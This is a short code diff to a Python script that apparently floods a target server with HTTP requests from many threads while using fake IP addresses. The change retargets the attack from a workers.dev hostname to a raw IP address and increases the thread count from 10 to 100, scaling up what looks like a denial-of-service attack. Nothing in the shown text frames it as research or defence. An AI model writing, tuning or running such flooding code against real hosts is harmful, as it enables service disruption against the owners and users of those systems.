@@ -3,8 +3,8 @@ import random
 import threading
 
 # Define the target server and port
-target = "sxtcp.tg-index.workers.dev"
-port = 80
+target = "38.242.194.12"
+port = 80  # HTTP typically uses port 80
 
 # Define the first fake IP address
 fake_ip1 = "20.205.61.143"
@@ -56,7 +56,7 @@ def send_request_with_fake_ip3():
 
 # Create and start 10 threads for each function
 threads = []
-for _ in range(10):
+for _ in range(100):
     thread1 = threading.Thread(target=send_request_with_fake_ip1)
     thread2 = threading.Thread(target=send_request_with_fake_ip2)
     thread3 = threading.Thread(target=send_request_with_fake_ip3)
